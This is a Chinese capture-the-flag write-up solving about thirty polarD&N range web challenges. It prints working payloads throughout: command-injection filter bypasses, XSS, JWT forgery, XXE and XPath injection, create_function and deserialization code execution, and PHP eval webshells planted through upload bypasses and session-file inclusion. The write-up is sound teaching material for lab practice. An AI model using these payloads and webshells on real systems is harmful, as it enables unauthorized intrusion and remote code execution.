# polarD&N靶场web

## 简单部分

### swp

当用vim打开文件，但是终端异常退出时系统会产生一个.文件名swp的文件。当源文件被意外删除时，可以利用swp文件恢复源文件

通过dirsearch扫描可以扫到.index.php.swp

![image-20240123165522230](image/image-20240123165522230.png)

访问

![image-20240123165711383](image/image-20240123165711383.png)

得到以上内容

美化一下

```
function jiuzhe($xdmtql){ //接受一个xdmtql变量
return preg_match('/sys.*nb/is',$xdmtql); //匹配变量
} 
$xdmtql=@$_POST['xdmtql']; 
if(!is_array($xdmtql)){ //判断变量是否为数组类型，不为数组类型往下判断
if(!jiuzhe($xdmtql)){//利用jiuzhe函数进行匹配输入的值
if(strpos($xdmtql,'sys nb')!==false){ //绕过 preg_match函数后匹配变量，匹配到的话输出flag
echo 'flag{*******}'; 
}else{ 
echo 'true .swp file?'; 
}
}
else
{ echo 'nijilenijile'; //匹配到/sys.*nb/is的话输出
}
}

```

这段代码的重点是如何同时绕过pre_match和strpos函数，一个不让匹配到，一个又要匹配到。这里就涉及到一个回溯问题，就是pre_match函数处理的字符长度有限，如果超过这个长度就会返回false也就是没有匹配到。利用利用下面的代码进行回溯，让pre_match函数报错，绕过该函数，这样strpos函数就可以顺利的匹配到我们的字符串从而输出flag

```
import requests
data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}
res = requests.post('http://9d843e14-9320-4bf0-ab03-cecd33daf911.www.polarctf.com:8090/', data=data, allow_redirects=False)
print(res.content)

```

在kali中运行脚本

![image-20240123171103198](image/image-20240123171103198.png)

得到flag

![image-20240123171020275](image/image-20240123171020275.png)

------

### 简单rce

polarD&N靶场web部分
一、简单rce
登陆页面，

![image-20240123171826957](image/image-20240123171826957.png)

简单分析，过滤了以下命令

```
cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen|
```

需要get传入sys参数，post传入“yyds=666”

![image-20240123171849150](image/image-20240123171849150.png)

进行传参后，进行目录查询
发现此目录下仅有一个php文件，查询一下根目录，因为空格过滤，所以需要空格绕过，get传入下
面代码

```
?sys=passthru('ls${IFS}/');
```

![image-20240123171941642](image/image-20240123171941642.png)

发现flag，因为过滤，所以需要利用\绕过。进行输出flag

```
?sys=passthru('t\ac${IFS}/flag');
```

得到flag

![image-20240123172051408](image/image-20240123172051408.png)

总结一下

```
此题考了命令过滤，以及命令执行函数
命令执行函数
system() 输出并返回最后一行shell结果。（被过滤！）
exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
shell_exec() 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。（被过滤！）
passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）
popen()/proc_open() 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令
执行结果。该函数有两个参数。（被过滤！）
输出函数
cat函数 由第一行开始显示内容，并将所有内容输出（被过滤！）
tac函数 从最后一行倒序显示内容，并将所有内容输出（被过滤！）
nl 类似于cat -n，显示时输出行号（被过滤！）
more 根据窗口大小，一页一页的现实文件内容（被过滤！）
less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符（被过滤！）
head 只显示头几行（被过滤！）
tail 只显示最后几行（被过滤！）
sort 文本内容排列
uniq 可检查文本文件中重复出现的行列。
od od （Octal Dump）命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或ASCII编码
字符方式显示，通常用于显示或查看文件中不能直接显示在终端的字符。od命令系统默认的显示方式是八进
制。
空格绕过：
${IFS}
{IFS}$9
$IFS$9
重定向符：<>（但是不支持后面跟通配符）
%09 水平制表符
%0a 回车
%0d 换行
```

------

### 蜜雪冰城吉警店

分析

![image-20240123172254371](image/image-20240123172254371.png)

要求找到第九款奶茶

先看一下网页源码

![image-20240123172545078](image/image-20240123172545078.png)

只有id1-8，我们将8改成9，点击一下试试

![image-20240123172633837](image/image-20240123172633837.png)

得到flag

![image-20240123172520938](image/image-20240123172520938.png)

------

### 召唤神龙

让我们打游戏，这种题直接查看源文件

![image-20240123173044715](image/image-20240123173044715.png)

找到可以代码

尝试解码得到flag

![image-20240123173342497](image/image-20240123173342497.png)

------

### seek flag

![image-20240123173523165](image/image-20240123173523165.png)

看一下源码，发现提示

御剑扫一下后台

![image-20240123174433932](image/image-20240123174433932.png)

发现robots.txt

打开查看，发现flag3

![image-20240123174508723](image/image-20240123174508723.png)

发现cookie

![image-20240123174153725](image/image-20240123174153725.png)

抓包将id=0改为1

发现flag1和2

![image-20240123175524118](image/image-20240123175524118.png)

最后得到flag

flag{7ac5b3ca8737a70f029dc0ad71dadd11}

------

<div style="page-break-after:always"></div>

### JWT

what is JWT

```
    JSON Web Token（JSON Web令牌）

    是一个开放标准(rfc7519)，它定义了一种紧凑的、自包含的方式，用于在各方之间以JSON对象安全地传输信息。此信息可以验证和信任，因为它是数字签名的。jwt可以使用秘密〈使用HNAC算法）或使用RSA或ECDSA的公钥/私钥对进行签名。

    通过JSON形式作为Web应用中的令牌，用于在各方之间安全地将信息作为JSON对象传输。在数据传输过程中还可以完成数据加密、签名等相关处理。巴拉巴拉的https://blog.csdn.net/Top_L398/article/details/109361680
    看去吧
```

简单点说

JWT分为三部分abc

```
a:标头  b:有效载荷  c:签名
```

先看题目

![image-20240123221815417](image/image-20240123221815417.png)

没有账号，我们先注册一个admin

![image-20240123221906181](image/image-20240123221906181.png)

提示用户名已经被注册，猜测可能flag可能和admin有关，可能需要登录admin账户

随便注册一个登录

查看个人中心并进行抓包

![image-20240123222731336](image/image-20240123222731336.png)

发现JWT

拿过来分析一下

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8SGkFhdaEt0zvByKBtz1oO8ikAFCDHblv1iPowur7e0

明显的看出来有三段，中间用点隔开
```

这时候就要用到JWT解码工具https://www.bejson.com/jwt/

![image-20240123223701680](image/image-20240123223701680.png)

可以看到载荷的内容为

```
{
  "username": "1"
}
```

同时注意JWT算是一种加密，自然有密钥

密钥自然是有办法破解的，用到工具c-jwt-cracker

下载教程https://blog.csdn.net/m0_61025358/article/details/134744252

最后得到密钥SYSA



![image-20240123224033657](image/image-20240123224033657.png)

我们将

```
{
  "username": "1"
}
改成
{
  "username": "admin"
}
并且加上密钥，进行编译

```

得到一串新的JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.9avq5ApZ-XZul2kbon8z2cB6Y4bNru_0nnIZfJ1mO50
```

将之前抓包的JWT替换为新的JWT，并发包

![image-20240123224949023](image/image-20240123224949023.png)

得到flag

------

### login

查看源码，发现提示

![image-20240123230504992](image/image-20240123230504992.png)

登录，提示成功登录

![image-20240123230525698](image/image-20240123230525698.png)

然后呢？

试一下20200102

发现f

![image-20240123230910820](image/image-20240123230910820.png)

试一下20200103

发现l

![image-20240123230950529](image/image-20240123230950529.png)

大胆推测，往后每一个都有一个字符，凑出flag

用bp抓下包

![image-20240123231546246](image/image-20240123231546246.png)

![image-20240123231556037](image/image-20240123231556037.png)

中间还有一串

```
flag{dlcg}
```

------

### iphone

打开提示要iphone或ipad登录

![image-20240124113008356](image/image-20240124113008356.png)

我们只要将

![image-20240124113037150](image/image-20240124113037150.png)

改成iphone就欧克了，得到flag

![image-20240124113642812](image/image-20240124113642812.png)

------

### 浮生日记

![image-20240124114009536](image/image-20240124114009536.png)

网页标签提示要弹窗，那就是XSS

我们在输入框输入弹窗代码

![image-20240124114121777](image/image-20240124114121777.png)

发现不对![image-20240124114852844](image/image-20240124114852844.png)

这个地方是我们要输入的，

```
<script>被过滤
我们要更换一下，采用
<scrscriptipt>
因为script被过滤，输入就会被删除，如果输入scrscriptipt，中间被删除，两边又重新构建出了script
```

![image-20240124115105909](image/image-20240124115105909.png)

我们要将他闭合掉

![image-20240124115257205](image/image-20240124115257205.png)

我们要改为

```
"><scrscriptipt>alert(1)</scrscriptipt><"
```

![image-20240124115421968](image/image-20240124115421968.png)

```
<input name="keyword" value="输入内容">

<input name="keyword" value=""> <script>alert(1)</script><"
第一个"和前面的value="闭合，>和前面的<input 中的<闭合，最后的<"和">闭合

```

输入，出现弹框

![image-20240124115757172](image/image-20240124115757172.png)

得到flag

![image-20240124115803451](image/image-20240124115803451.png)

------

### $$

这题考的是超全局变量https://www.cnblogs.com/pawn-i/p/12088639.html

**$GLOBALS** 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。

PHP 在名为 **$GLOBALS[index]** 的数组中存储了所有全局变量。变量的名字就是数组的键。

```
global在PHP中的解析是：global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。
注：在函数体内定义的global变量,函数体外可以使用,在函数体外定义的global变量不能在函数体内使用
$GLOBALS：用于访问所有全局变量(来自全局范围的变量),即可以从PHP脚本中的任何范围访问的变量。 
```

这题我们直接传入

```
?c=GLOBALS
```

得到flag

![image-20240124120831754](image/image-20240124120831754.png)

------

### 爆破

分析代码

![image-20240124121017514](image/image-20240124121017514.png)

分析一下

```
    $pass = md5($_GET['pass']);: 从 GET 请求中获取参数 'pass' 的值，并使用 MD5 哈希函数对其进行哈希处理，将结果存储在变量 $pass 中。

    substr($pass, 1, 1) === substr($pass, 14, 1) && substr($pass, 14, 1) === substr($pass, 17, 1): 检查密码的第2、第15和第18个字符是否相等。

    if((intval(substr($pass, 1, 1)) + intval(substr($pass, 14, 1)) + substr($pass, 17, 1)) / substr($pass, 1, 1) === intval(substr($pass, 31, 1))): 这一步对密码的字符进行一些数学运算。首先，将密码的第2、第15和第18个字符转换为整数，然后将它们相加。接着，将这个和除以密码的第2个字符，最后检查是否等于密码的第32个字符（注意，数组索引从0开始，所以第32个字符的索引是31）。
```

构建代码

```python
import hashlib

for i in range(1, 10000):

    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()

    if md5[1] != md5[14] or md5[14] != md5[17]:
        continue

    if (ord(md5[1])) >= 48 and ord(md5[1]) <= 57 and (ord(md5[31])) >= 48 and ord(md5[31]) <= 57:

        if ((int(md5[1]) + int(md5[14]) + int(md5[17])) / int(md5[1]) == int(md5[31])):
            print(i)
```

得到数字422，1202

![image-20240124122006264](image/image-20240124122006264.png)

构建代码

```
?pass=422
```

得到flag

![image-20240124122107271](image/image-20240124122107271.png)

------

### XFF

![image-20240124122231411](image/image-20240124122231411.png)

伪装ip

![image-20240124122428219](image/image-20240124122428219.png)

得到flag

![image-20240124122440218](image/image-20240124122440218.png)

------

### rce1

![image-20240124122738087](image/image-20240124122738087.png)

有个ping，ping一下127.0.0.1试一下

![image-20240124122811056](image/image-20240124122811056.png)

试一下

```
127.0.0.1;ls
```

![image-20240124122858771](image/image-20240124122858771.png)

可以执行命令

![image-20240124122919293](image/image-20240124122919293.png)

提示就过滤了空格

构建命令

```
127.0.0.1;cat${IFS}fllllaaag.php
```

![image-20240124123509136](image/image-20240124123509136.png)

得到flag

------

### GET-POST

![image-20240124123646249](image/image-20240124123646249.png)

听人话出饱饭

传一个id=1

![image-20240124123735260](image/image-20240124123735260.png)

继续

```
jljcxy=flag
```

然后就没有然后了？签到题？

![image-20240124123818549](image/image-20240124123818549.png)

------

### 被黑掉的站

![image-20240124124016060](image/image-20240124124016060.png)

扫一下后台

![image-20240124124050096](image/image-20240124124050096.png)

两个网站，进去看看

![image-20240124124120782](image/image-20240124124120782.png)

密码不知道。一定是还有东西没有扫到

在kali扫一下

![image-20240124124813955](image/image-20240124124813955.png)

出现一个新的index.php.bak 

打开查看，发现是本字典

![image-20240124124952581](image/image-20240124124952581.png)

那就爆破一下

![image-20240124125808128](image/image-20240124125808128.png)

发现密码

![image-20240124125823461](image/image-20240124125823461.png)

得到flag

------

### 签到题

扫面后台

![image-20240124130114762](image/image-20240124130114762.png)

打开第一个

![image-20240124130125383](image/image-20240124130125383.png)

发现代码

```
include_once
```

会直接执行命令，可以构造一下php伪协议

关于php为协议https://blog.csdn.net/cosmoslin/article/details/120695429

```
常用的几个
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php


适用于include（$参数）

data:text/plain,<?=system("tac fla*");?>

data伪协议的格式:

data://text/plain;base64,

data:资源类型(MIME类型);编码,内容


    
1.c=data://text/plain,<?php system("cat fla*");?>
读flag

2.c=data:,<?php @eval($_POST['shell']); ?>
可以直接用蚁剑连接

3.c=data:text/base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=

data类型扩展
data:,                                     <文本数据>
data:text/plain,                           <文本数据>
data:text/html,                            <HTML代码>
data:text/html;base64,                     <base64编码的HTML代码>
data:text/css,                             <CSS代码>
data:text/css;base64,                      <base64编码的CSS代码>
data:text/javascript,                      <Javascript代码>
data:text/javascript;base64,               <base64编码的Javascript代码>
data:image/gif;base64,                     <base64编码的gif图片数据>
data:image/png;base64,                     <base64编码的png图片数据>
data:image/jpeg;base64,                    <base64编码的jpeg图片数据>
data:image/x-icon;base64,                  <base64编码的icon图片数据>
```

这里我们用

```
?file=php://filter/read=convert.base64-encode/resource=..././..././..././..././flag
```

得到base64

![image-20240124130533543](image/image-20240124130533543.png)

解码得到flag

![image-20240124130602315](image/image-20240124130602315.png)

------

### 签到

![image-20240124132231134](image/image-20240124132231134.png)

发现一个隐藏按钮

点击，获得提示

![image-20240124132308349](image/image-20240124132308349.png)

![image-20240124132345120](image/image-20240124132345120.png)

进行提交，发现有位数限制

![image-20240124132451836](image/image-20240124132451836.png)



将限制改为99

重新提交，得到flag

![image-20240124132525604](image/image-20240124132525604.png)

------

### session文件包含

```
当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。

session文件名的构造是sess_  + sessionid  ， sessionid在cookie中可以查看

cookie 中的 PHPSESSID

每一次SESSION会话都有一个SESSION ID，用来识别不同的会话，保存在浏览器Cookie之中，也就是这个名为PHPSESSID的Cookie（当然，这个名称是可以更改的）。
浏览器将Cookie（包括PHPSESSID）发送给服务器，PHP才知道应该使用哪一个SESSION传递给PHP程序。

常见的php-session存放位置：

    /var/lib/php/sess_PHPSESSID
    /var/lib/php/sess_PHPSESSID
    /tmp/sess_PHPSESSID
    /tmp/sessions/sess_PHPSESSID

```

打开实例

![image-20240125150649964](image/image-20240125150649964.png)

点进去，发现两个链接

点击进入

![image-20240125150725842](image/image-20240125150725842.png)

![image-20240125150731738](image/image-20240125150731738.png)

查看一下url

![image-20240125150758594](image/image-20240125150758594.png)

这种格式是不是很熟悉，伪协议

简单分析一下，两个php：index.php和action.php以及两个文件1.txt和2.txt

先读取一下两个php

index.php未发现线索

![image-20240125151051906](image/image-20240125151051906.png)

action.php

![image-20240125151137524](image/image-20240125151137524.png)

发现一个post传参为name

我们要读取一下session文件

看一下cookie

![image-20240125151403313](image/image-20240125151403313.png)

根据前情提要session文件名的构造是sess_  + sessionid  ， sessionid在cookie中可以查看

也就是sess_057hm6l3er440l9gb0rh3urms3

读取一下

![image-20240125152005552](image/image-20240125152005552.png)

接下来两种方法

#### 方法一：命令读取

查看目录

```
name=<?php system("ls /");?>
```

![image-20240125152146052](image/image-20240125152146052.png)

读取flag

![image-20240125152347579](image/image-20240125152347579.png)

cat无法读取，应该是有过滤

试一下sort

```
name=<?php system("sort /flaggggg");?>
```

![image-20240125152535232](image/image-20240125152535232.png)

得到flag

#### 方法二：蚁剑链接

```
name=<?php @eval($_POST[shell]);?>
```

![image-20240125152806014](image/image-20240125152806014.png)

------

### Don't touch me

查看源代码

![image-20240125153040452](image/image-20240125153040452.png)

发现提示2.php

进入查看

![image-20240125153117456](image/image-20240125153117456.png)

发现一个按钮，但是无法点击，查看一下源码，发现3.php

![image-20240125153150330](image/image-20240125153150330.png)

进入查看

![image-20240125153232257](image/image-20240125153232257.png)

发现fla.php

进入查看，发现flag

![image-20240125153307232](image/image-20240125153307232.png)

------

### robots

![image-20240125160246832](image/image-20240125160246832.png)

根据提示，查看robots.txt

![image-20240125160331610](image/image-20240125160331610.png)

发现提醒fl0g.php

查看fl0g.php

![image-20240125160404653](image/image-20240125160404653.png)

得到flag

------

### php very nice

反序列化

将源码复制到phpstorm中

![image-20240125173116020](image/image-20240125173116020.png)

其中eval的参数是可控的

我们可以将其进行更改，然后将其传入a中

我们构建一个PHP info的页面进行测试

```
 $a = new Example();
 $a->sys="phpinfo();";
 echo "\n";
 echo serialize($a);
 
 O:7:"Example":1:{s:3:"sys";s:10:"phpinfo();";}
 
```

![image-20240125173607194](image/image-20240125173607194.png)

------

发现可行，那我们构建命令



```
 $a = new Example();
 $a->sys="system('ls');";
 echo "\n";
 echo serialize($a);

O:7:"Example":1:{s:3:"sys";s:13:"system('ls');";}
```

将其传入可以看到文件列表

![image-20240125173810405](image/image-20240125173810405.png)

构建命令进行读取

```
 $a = new Example();
 $a->sys="system('cat f*');";
 echo "\n";
 echo serialize($a);

O:7:"Example":1:{s:3:"sys";s:17:"system('cat f*');";}
```

将其传入可以看到在源代码中得到flag

![image-20240125173941436](image/image-20240125173941436.png)

------

### ezupload

文件上传

查看一下源码，看看有没有前端限制，发现没有

直接上传图片码

问题出现，只让上传gif

![image-20240125154722407](image/image-20240125154722407.png)

把图片码改个名

进行上传抓包

![image-20240125154951299](image/image-20240125154951299.png)

将文件名后缀改为php，进行发送，提示上传成功

打开upload查看

![image-20240125155102759](image/image-20240125155102759.png)

进入php查看，确实成功上传，蚁剑链接

![image-20240125155226463](image/image-20240125155226463.png)

![image-20240125155918163](image/image-20240125155918163.png)

得到flag

------

### cookie欺骗

![image-20240125160102525](image/image-20240125160102525.png)

重新编辑cookie

构造![image-20240125160151752](image/image-20240125160151752.png)

得到flag

![image-20240125160204111](image/image-20240125160204111.png)

------

### upload

上传过程中发现提示![image-20240125160758574](image/image-20240125160758574.png)

进去看一下

![image-20240125160849189](image/image-20240125160849189.png)

原来是代码

```
"php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"
```

这些后缀被禁

正常上传php后缀的，php会被禁

![image-20240125161429409](image/image-20240125161429409.png)

可以双写绕过，我这里用的是pphphp

![image-20240125161547741](image/image-20240125161547741.png)

就构建出一个php

![image-20240125161608432](image/image-20240125161608432.png)

打开地址

![image-20240125161641819](image/image-20240125161641819.png)

成功上传，蚁剑链接得到flag

![image-20240125161706202](image/image-20240125161706202.png)

------

### 干正则

![image-20240125162645298](image/image-20240125162645298.png)

分析flag被禁，@parse_str()函数就是读取一个变量并将其转换为数组的形式

get传一个id，令id=a[0]

a[0]=www.polarctf.com

再构建一个cmd，cmd自带参数ping，由此构建命令

```
?id=a[0]=www.polarctf.com&cmd=127.0.0.1;ls
```

![image-20240125163107371](image/image-20240125163107371.png)

得到文件列表,flag无法直接cat，直接cat ls

```
?id=a[0]=www.polarctf.com&cmd=127.0.0.1;cat 'ls';
```

![image-20240125163607360](image/image-20240125163607360.png)

查看源码

得到flag

![image-20240125163615671](image/image-20240125163615671.png)

------

### cool

![image-20240125164002100](image/image-20240125164002100.png)

system被禁，我们用passthru

```
?a=passthru("ls");
```

![image-20240125164104920](image/image-20240125164104920.png)

读取flag

```
?a=passthru("cat f*");
```

![image-20240125164233155](image/image-20240125164233155.png)

得到flag

<div style="page-break-after:always"></div>

------

## 中等部分

### 到底给不给flag

![image-20240126095413959](image/image-20240126095413959.png)

需要get一个flag和post一个flag。然后看了眼函数，其中foreach加上。因为isset那里面是&&连接。所以POST是可以不用传的。直接get传参一个flag。

先a=flag然后让flag=a。这样被解析之后，就是$a=$flag&$flag=$a。从而达到真正输出flag的作用。而不会用一个变量a把$flag=flag{xxxxxx}给覆盖。那么最后就是$flag

构建命令

```
?a=flag&flag=a
```

 查看源码，得到flag

![image-20240126095541645](image/image-20240126095541645.png)

------

### 写shell

![image-20240126101834090](image/image-20240126101834090.png)

```
file_put_content函数在请求访问时没有该文件会新建一个文件，文件的内容被拼接上了"<?php exit();"，这就导致如果我们按常规思路写shell进去的话，
<?php 
	exit();
<?php
	eval($_POST[123]);
?>
执行时就会直接先执行exit()退出了，我们后面的shell代码是无法执行的。
此时。我们将shell写成
aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=
解读一下：PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=是经过base64加密的<?php eval($_POST[123]);?>
前面的a是为了凑出base64编码，如果不加1位，会发现编码解不出来
那我们的shell最终就变成
<?php exit();aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=
经过base64解码可得
&^F+Z<?php eval($_POST[123]);?>
就跳过了exit()
```

所以post传参的参数为

```
content=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=
```

我们要用base64解码的形式去读取shell，并将传入的shell进行base64解码并进行保存，所以get传参为

```
?filename=php://filter/convert.base64-decode/resource=shell.php
```

接下来我们访问shell.php

访问后有两种方法获得flag，第一种是蚁剑链接，对于不知道flag位置的，比较方便，

第二种是直接构架命令

```
123=system('ls /');
```

![image-20240126103731156](image/image-20240126103731156.png)

得到flag位置，构建命令查看flag

```
123=system('cat /f*');
```

![image-20240126103822453](image/image-20240126103822453.png)

------

### 注入

<img src="image/image-20240126112312838.png" alt="image-20240126112312838" style="zoom:50%;" />

点击进入，发现是一个get传参传入id=1

<img src="image/image-20240126112408290.png" alt="image-20240126112408290" style="zoom:50%;" />

试一下2

<img src="image/image-20240126112429897.png" alt="image-20240126112429897" style="zoom:50%;" />

也是有东西的，猜测flag应该在某个数字里面，但是我们传到7就会发现没有回显

这里用的是Xpath的注入，具体原理在此链接

https://blog.csdn.net/qq_63701832/article/details/129433006

```
这是本题用的方式
']|//*|//*['
$query="user/username[@name='']|//*|//*['';
这里闭合了$user前后的单引号同时执行三个操作，其中第二个操作//*即是关键点，列出文档中的所有元素，最后拿到flag
```

那我们直接传入

```
?id=']|//*|//*['
```

![image-20240126113159172](image/image-20240126113159172.png)

就可以列出所有内容，得到flag

<div style="page-break-after:always"></div>

------

### 某函数的复仇

![image-20240126120759761](image/image-20240126120759761.png)

分析代码

```
preg_match('/^[a-z_]*$/isD',$shaw)//开头为字母、下划线以及结尾不允许换行
$shaw('',$root);//create_function匿名函数代码注入
/i不区分大小写

/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]

/D如果使用$限制结尾字符,则不允许结尾有换行;

对于^开头，$结尾的正则，如果用.进行任意字符匹配，那么则不包括换行符

```

create_function函数

```php
语法：
 
create_function(string $args,  string $code)
 
string $args 声明的函数变量部分
 
string $code 执行的方法代码部分

例如：
<?php
error_reporting(0);
$sort_by = $_GET['sort_by'];
$sorter = 'strnatcasecmp';
$databases=array('1234','4321');
$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
usort($databases, create_function('$a, $b', $sort_function));
?>

当构建payload为
'"]);}phpinfo();/*

实际的组合过程为
$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by '"]);}phpinfo();/*
 将前面的闭合并执行phpinfo的命令   
```

本题中

```
我们要post传入一个

create_function()

$shaw('',$root);
题目就变成了
create_function('', $root)

get传入来查询目录，}用来闭合前面的函数
1;}system('ls /');/*
```

![image-20240130135238377](image/image-20240130135238377.png)

然后post传参不变，构建get命令读取flag

```
1;}system('more /f*');/*
```

得到flag

![image-20240130135359533](image/image-20240130135359533.png)

------

### xxe

先了解一下什么是xxe

https://blog.csdn.net/weixin_44420143/article/details/118721145

XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string()。

dirsearch扫描发先dom.php

![image-20240130140502957](image/image-20240130140502957.png)

访问查看

![image-20240130140548182](image/image-20240130140548182.png)

发现有各类的配置信息出现，直接利用该文件发送xml语句

```
文件读取的利用和payload非常好理解，即使用file协议读取文件内容，并输出到页面上（有回显的情况）。

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=读取的文件名" >]>
<root>
<name>&xxe;</name>
</root>
```

这里根据一开始实例的提示，flag在flagggg.php，直接利用伪协议读取该文件

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flagggg.php" >]>
<root>
<name>&xxe;</name>
</root>
```

![image-20240130141737337](image/image-20240130141737337.png)

得到base64编码的flag

![image-20240130141808890](image/image-20240130141808890.png)

解码得到flag

![image-20240130141821388](image/image-20240130141821388.png)

------

